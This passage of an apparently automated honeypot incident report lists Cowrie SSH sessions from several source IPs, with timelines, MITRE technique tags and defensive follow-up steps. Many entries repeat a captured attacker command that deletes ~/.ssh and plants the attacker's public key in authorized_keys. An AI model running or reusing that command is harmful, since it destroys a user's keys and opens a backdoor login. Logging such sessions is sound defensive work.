| `2026-06-12 19:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b561625c26

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:10 |
| **Last Seen** | 2026-06-12 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:10:13` | `cowrie.session.connect` |
| `2026-06-12 19:10:13` | `cowrie.client.version` |
| `2026-06-12 19:10:13` | `cowrie.client.kex` |
| `2026-06-12 19:10:14` | `cowrie.login.success` |
| `2026-06-12 19:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b2edd21ea8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:11 |
| **Last Seen** | 2026-06-12 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:11:08` | `cowrie.session.connect` |
| `2026-06-12 19:11:08` | `cowrie.client.version` |
| `2026-06-12 19:11:08` | `cowrie.client.kex` |
| `2026-06-12 19:11:09` | `cowrie.login.success` |
| `2026-06-12 19:11:09` | `cowrie.session.params` |
| `2026-06-12 19:11:09` | `cowrie.command.input` |
| `2026-06-12 19:11:09` | `cowrie.command.failed` |
| `2026-06-12 19:11:09` | `cowrie.log.closed` |
| `2026-06-12 19:11:10` | `cowrie.session.params` |
| `2026-06-12 19:11:10` | `cowrie.command.input` |
| `2026-06-12 19:11:10` | `cowrie.session.file_download` |
| `2026-06-12 19:11:10` | `cowrie.log.closed` |
| `2026-06-12 19:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d021e0f688

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:11 |
| **Last Seen** | 2026-06-12 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:11:12` | `cowrie.session.connect` |
| `2026-06-12 19:11:12` | `cowrie.client.version` |
| `2026-06-12 19:11:12` | `cowrie.client.kex` |
| `2026-06-12 19:11:12` | `cowrie.login.success` |
| `2026-06-12 19:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667346c1317b

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:11 |
| **Last Seen** | 2026-06-12 19:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:11:30` | `cowrie.session.connect` |
| `2026-06-12 19:11:30` | `cowrie.client.version` |
| `2026-06-12 19:11:30` | `cowrie.client.kex` |
| `2026-06-12 19:11:30` | `cowrie.login.success` |
| `2026-06-12 19:11:31` | `cowrie.session.params` |
| `2026-06-12 19:11:31` | `cowrie.command.input` |
| `2026-06-12 19:11:31` | `cowrie.command.failed` |
| `2026-06-12 19:11:31` | `cowrie.log.closed` |
| `2026-06-12 19:11:31` | `cowrie.session.params` |
| `2026-06-12 19:11:31` | `cowrie.command.input` |
| `2026-06-12 19:11:31` | `cowrie.session.file_download` |
| `2026-06-12 19:11:31` | `cowrie.log.closed` |
| `2026-06-12 19:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf393eefe5f0

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:11 |
| **Last Seen** | 2026-06-12 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:11:33` | `cowrie.session.connect` |
| `2026-06-12 19:11:33` | `cowrie.client.version` |
| `2026-06-12 19:11:33` | `cowrie.client.kex` |
| `2026-06-12 19:11:33` | `cowrie.login.success` |
| `2026-06-12 19:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f398cc4c2756

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:12 |
| **Last Seen** | 2026-06-12 19:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:12:34` | `cowrie.session.connect` |
| `2026-06-12 19:12:34` | `cowrie.client.version` |
| `2026-06-12 19:12:34` | `cowrie.client.kex` |
| `2026-06-12 19:12:35` | `cowrie.login.success` |
| `2026-06-12 19:12:36` | `cowrie.session.params` |
| `2026-06-12 19:12:36` | `cowrie.command.input` |
| `2026-06-12 19:12:36` | `cowrie.command.failed` |
| `2026-06-12 19:12:36` | `cowrie.log.closed` |
| `2026-06-12 19:12:36` | `cowrie.session.params` |
| `2026-06-12 19:12:36` | `cowrie.command.input` |
| `2026-06-12 19:12:36` | `cowrie.session.file_download` |
| `2026-06-12 19:12:36` | `cowrie.log.closed` |
| `2026-06-12 19:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25862e44a311

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:12 |
| **Last Seen** | 2026-06-12 19:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:12:39` | `cowrie.session.connect` |
| `2026-06-12 19:12:40` | `cowrie.client.version` |
| `2026-06-12 19:12:40` | `cowrie.client.kex` |
| `2026-06-12 19:12:41` | `cowrie.login.success` |
| `2026-06-12 19:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb259670d00

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:12 |
| **Last Seen** | 2026-06-12 19:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:12:54` | `cowrie.session.connect` |
| `2026-06-12 19:12:54` | `cowrie.client.version` |
| `2026-06-12 19:12:54` | `cowrie.client.kex` |
| `2026-06-12 19:12:54` | `cowrie.login.success` |
| `2026-06-12 19:12:54` | `cowrie.session.params` |
| `2026-06-12 19:12:54` | `cowrie.command.input` |
| `2026-06-12 19:12:54` | `cowrie.command.failed` |
| `2026-06-12 19:12:55` | `cowrie.log.closed` |
| `2026-06-12 19:12:55` | `cowrie.session.params` |
| `2026-06-12 19:12:55` | `cowrie.command.input` |
| `2026-06-12 19:12:55` | `cowrie.session.file_download` |
| `2026-06-12 19:12:55` | `cowrie.log.closed` |
| `2026-06-12 19:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9b598f09d3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:12 |
| **Last Seen** | 2026-06-12 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:12:57` | `cowrie.session.connect` |
| `2026-06-12 19:12:57` | `cowrie.client.version` |
| `2026-06-12 19:12:57` | `cowrie.client.kex` |
| `2026-06-12 19:12:58` | `cowrie.login.success` |
| `2026-06-12 19:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-085231994919

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:15 |
| **Last Seen** | 2026-06-12 19:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:15:33` | `cowrie.session.connect` |
| `2026-06-12 19:15:33` | `cowrie.client.version` |
| `2026-06-12 19:15:33` | `cowrie.client.kex` |
| `2026-06-12 19:15:33` | `cowrie.login.success` |
| `2026-06-12 19:15:34` | `cowrie.session.params` |
| `2026-06-12 19:15:34` | `cowrie.command.input` |
| `2026-06-12 19:15:34` | `cowrie.command.failed` |
| `2026-06-12 19:15:34` | `cowrie.log.closed` |
| `2026-06-12 19:15:34` | `cowrie.session.params` |
| `2026-06-12 19:15:34` | `cowrie.command.input` |
| `2026-06-12 19:15:34` | `cowrie.session.file_download` |
| `2026-06-12 19:15:34` | `cowrie.log.closed` |
| `2026-06-12 19:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9d524a4219

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:15 |
| **Last Seen** | 2026-06-12 19:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:15:36` | `cowrie.session.connect` |
| `2026-06-12 19:15:36` | `cowrie.client.version` |
| `2026-06-12 19:15:36` | `cowrie.client.kex` |
| `2026-06-12 19:15:37` | `cowrie.login.success` |
| `2026-06-12 19:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8863427d733

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:17 |
| **Last Seen** | 2026-06-12 19:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:17:20` | `cowrie.session.connect` |
| `2026-06-12 19:17:20` | `cowrie.client.version` |
| `2026-06-12 19:17:20` | `cowrie.client.kex` |
| `2026-06-12 19:17:21` | `cowrie.login.success` |
| `2026-06-12 19:17:22` | `cowrie.session.params` |
| `2026-06-12 19:17:22` | `cowrie.command.input` |
| `2026-06-12 19:17:22` | `cowrie.command.failed` |
| `2026-06-12 19:17:22` | `cowrie.log.closed` |
| `2026-06-12 19:17:22` | `cowrie.session.params` |
| `2026-06-12 19:17:22` | `cowrie.command.input` |
| `2026-06-12 19:17:23` | `cowrie.session.file_download` |
| `2026-06-12 19:17:23` | `cowrie.log.closed` |
| `2026-06-12 19:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b81348f9b7

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:17 |
| **Last Seen** | 2026-06-12 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:17:25` | `cowrie.session.connect` |
| `2026-06-12 19:17:25` | `cowrie.client.version` |
| `2026-06-12 19:17:26` | `cowrie.client.kex` |
| `2026-06-12 19:17:26` | `cowrie.login.success` |
| `2026-06-12 19:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba48ee59cf20

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:19 |
| **Last Seen** | 2026-06-12 19:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:19:29` | `cowrie.session.connect` |
| `2026-06-12 19:19:29` | `cowrie.client.version` |
| `2026-06-12 19:19:30` | `cowrie.client.kex` |
| `2026-06-12 19:19:30` | `cowrie.login.success` |
| `2026-06-12 19:19:31` | `cowrie.session.params` |
| `2026-06-12 19:19:31` | `cowrie.command.input` |
| `2026-06-12 19:19:31` | `cowrie.command.failed` |
| `2026-06-12 19:19:32` | `cowrie.log.closed` |
| `2026-06-12 19:19:33` | `cowrie.session.params` |
| `2026-06-12 19:19:33` | `cowrie.command.input` |
| `2026-06-12 19:19:33` | `cowrie.session.file_download` |
| `2026-06-12 19:19:33` | `cowrie.log.closed` |
| `2026-06-12 19:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc5a21a0a80

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:19 |
| **Last Seen** | 2026-06-12 19:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:19:30` | `cowrie.session.connect` |
| `2026-06-12 19:19:30` | `cowrie.client.version` |
| `2026-06-12 19:19:30` | `cowrie.client.kex` |
| `2026-06-12 19:19:31` | `cowrie.login.success` |
| `2026-06-12 19:19:32` | `cowrie.session.params` |
| `2026-06-12 19:19:32` | `cowrie.command.input` |
| `2026-06-12 19:19:32` | `cowrie.command.failed` |
| `2026-06-12 19:19:33` | `cowrie.log.closed` |
| `2026-06-12 19:19:33` | `cowrie.session.params` |
| `2026-06-12 19:19:33` | `cowrie.command.input` |
| `2026-06-12 19:19:33` | `cowrie.session.file_download` |
| `2026-06-12 19:19:33` | `cowrie.log.closed` |
| `2026-06-12 19:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf968c6d274

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:19 |
| **Last Seen** | 2026-06-12 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:19:35` | `cowrie.session.connect` |
| `2026-06-12 19:19:35` | `cowrie.client.version` |
| `2026-06-12 19:19:36` | `cowrie.client.kex` |
| `2026-06-12 19:19:37` | `cowrie.login.success` |
| `2026-06-12 19:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b7491599184

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:19 |
| **Last Seen** | 2026-06-12 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:19:36` | `cowrie.session.connect` |
| `2026-06-12 19:19:36` | `cowrie.client.version` |
| `2026-06-12 19:19:36` | `cowrie.client.kex` |
| `2026-06-12 19:19:37` | `cowrie.login.success` |
| `2026-06-12 19:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629f93cac7c0

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:21 |
| **Last Seen** | 2026-06-12 19:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
